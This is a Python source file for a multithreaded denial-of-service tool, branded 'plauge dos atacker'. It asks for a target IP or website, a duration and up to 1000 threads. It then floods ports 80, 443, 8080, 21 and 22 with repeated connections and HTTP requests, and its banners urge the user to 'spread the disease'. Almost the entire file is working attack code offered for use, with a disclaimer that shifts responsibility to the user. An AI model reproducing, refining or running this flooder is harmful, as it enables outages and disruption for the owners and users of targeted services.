import socket
import time
import os
import threading
import random
from colorama import init, Fore, Back, Style
init(autoreset=True)

class Colors:
    HEADER = Fore.CYAN + Back.RED
    OKBLUE = Fore.BLUE
    OKCYAN = Fore.CYAN
    OKGREEN = Fore.GREEN
    WARNING = Fore.YELLOW
    FAIL = Fore.RED
    ENDC = Style.RESET_ALL
    BOLD = Style.BRIGHT
    UNDERLINE = Style.UNDERLINE

ports = [80, 443, 8080, 21, 22]  # Common ports to target

def attack(target, port, duration):
    timeout = time.time() + duration * 60
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)  # Set a lower timeout for faster request sending
        try:
            s.connect((target, port))
            start = time.time()
            if port == 80:
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            elif port == 443:
                s.send(b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            else:
                s.send(b"GET / HTTP/1.1\r\n\r\n")
            s.recv(1024)
            end = time.time()
            ping = round((end - start) * 1000, 2)
            # Use Style instead of Back to prevent adding control characters to the string
            print(Colors.OKGREEN + f"Successfully started to plague {target}:{port}! 🤢🦠 attempting to destroy | Ping: {ping}ms")
        except Exception as e:
            print(Colors.FAIL + f"IP/WEBSITE COULD BE FULLY INFECTED🟥: {e}")
        finally:
            s.close()
    print(Colors.ENDC + f"🟩Attack ended on {target}:{port}")

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print (Colors.OKCYAN + "┏┓┓ ┏┓┳┳┏┓┏┓")
    print (Colors.OKCYAN + "┃┃┃ ┣┫┃┃┃┓┣ ")
    print (Colors.OKCYAN + "┣┛┗┛┛┗┗┛┗┛┗┛")
    print(Colors.BOLD + "WELCOME TO plauge dos atacker") 
    print(Colors.UNDERLINE + "powered by enom")
    print(Colors.WARNING + "spread the disease")
    print(Colors.WARNING + "anything you do is not the owners fault")
    print(Colors.WARNING + "you have full responsibility over your actions")
    target = input(Colors.ENDC + "Enter the target IP or website: ")
    duration = int(input("Enter the duration in minutes: "))
    thread_count = int(input("Enter the number of threads to use(max for most sites 1000): "))
    
    print(f"Starting attack on {target} for {duration} minutes with {thread_count} threads. Press Ctrl+C to stop.")
    try:
        for _ in range(thread_count):
            port = random.choice(ports)
            thread = threading.Thread(target=attack, args=(target, port, duration))
            thread.start()
    except KeyboardInterrupt:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(Colors.HEADER + "Attack stopped")

if __name__ == "__main__":
    main()
